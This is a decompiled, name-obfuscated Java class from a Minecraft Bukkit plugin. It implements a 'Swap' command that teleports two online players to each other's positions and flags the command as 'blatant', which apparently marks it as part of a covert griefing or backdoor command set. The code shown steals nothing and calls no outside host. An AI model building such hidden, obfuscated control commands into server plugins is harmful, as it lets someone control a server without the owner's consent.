/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SwapCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIIllIlllIlIIIllIIII, String lllllllllllllIIllIlllIlIIIlIllll, String[] lllllllllllllIIllIlllIlIIIlIlIlI, Player lllllllllllllIIllIlllIlIIIlIllII) {
        if (lllllllllllllIIllIlllIlIIIlIlIlI.length <= 1) {
            lllllllllllllIIllIlllIlIIIlIllII.sendMessage(Settings.USAGE("Swap <player> <player>"));
        } else {
            Player lllllllllllllIIllIlllIlIIIllIIlI = Bukkit.getServer().getPlayer(lllllllllllllIIllIlllIlIIIlIlIlI[1]);
            if (lllllllllllllIIllIlllIlIIIllIIlI == null) {
                lllllllllllllIIllIlllIlIIIlIllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIIllIlllIlIIIlIlIlI[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                Player lllllllllllllIIllIlllIlIIIllIIll = Bukkit.getServer().getPlayer(lllllllllllllIIllIlllIlIIIlIlIlI[2]);
                if (lllllllllllllIIllIlllIlIIIllIIll == null) {
                    lllllllllllllIIllIlllIlIIIlIllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIIllIlllIlIIIlIlIlI[2]).append(Settings.WHITE).append(" is not online."))));
                } else {
                    lllllllllllllIIllIlllIlIIIlIllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(Settings.RED).append(lllllllllllllIIllIlllIlIIIllIIlI.getName()).append(Settings.WHITE).append(" and ").append(Settings.RED).append(lllllllllllllIIllIlllIlIIIllIIll.getName()).append(Settings.WHITE).append(" have swapped locations!"))));
                    lllllllllllllIIllIlllIlIIIllIIII.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllIIllIlllIlIIIllIIII, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllIIllIlllIlIIIllIIII, () -> lllllllllllllIIllIlllIlIIIllIIlI.teleport(lllllllllllllIIllIlllIlIIIllIIll.getLocation())).get();
                        }
                        catch (InterruptedException | ExecutionException lllllllllllllIIllIlllIlIIIIIIllI) {
                            // empty catch block
                        }
                    });
                    lllllllllllllIIllIlllIlIIIllIIII.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllIIllIlllIlIIIllIIII, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllIIllIlllIlIIIllIIII, () -> lllllllllllllIIllIlllIlIIIllIIll.teleport(lllllllllllllIIllIlllIlIIIllIIlI.getLocation())).get();
                        }
                        catch (InterruptedException | ExecutionException lllllllllllllIIllIlllIlIIIIlIlll) {
                            // empty catch block
                        }
                    });
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public SwapCommand() {
        SwapCommand lllllllllllllIIllIlllIlIIlIllIll;
    }
}

